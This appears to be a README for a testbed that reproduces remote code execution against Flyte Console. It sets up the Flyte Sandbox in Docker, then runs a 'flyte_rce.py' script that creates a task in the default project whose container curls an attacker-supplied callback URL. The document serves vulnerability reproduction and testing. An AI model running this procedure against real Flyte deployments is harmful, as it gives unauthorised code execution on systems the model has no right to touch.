
# Flyte Console

Follow these steps to set up a testbed for Flyte Console:

1. **Set the Flyte Helm Chart Version**:
   For this setup, we're using version 1.13.1. You can find a list of all available versions at [Artifact Hub](https://artifacthub.io/packages/helm/flyte/flyte).

   ```bash
   export FLYTE_HELM_CHART_VERSION=1.13.1
   ```

2. **Run Flyte Sandbox**:
   Run the following command to start the Flyte Sandbox environment. 

   ```bash
   docker run --rm --privileged -e FLYTE_VERSION=${FLYTE_HELM_CHART_VERSION} \
   -p 30080:30080 -p 30081:30081 -p 30082:30082 -p 30084:30084 \
   cr.flyte.org/flyteorg/flyte-sandbox:latest
   ```
    This setup will make the Flyte Console accessible at `http://localhost:30081/console` and the API available at` http://localhost:30081/api/v1/`.


# Steps to reproduce

1. Install flytekit using the following command

```bash
pip3 install flytekit
```

2. Execute the `flyte_rce.py` script to perform RCE by invoking the callback URL. The usage details are provided below.

```bash
python3 flyte_rce.py  --url http://localhost:30081 --callback_url  $CALLBACK_URL
```
#### How RCE executed ?

`flyte_rce.py` script creates a task within the default project `flytesnacks` and domain `development`, utilizing the `docker.io/nginx:latest` Docker image, and runs the `curl` command with the specified `--callback_url` parameter.

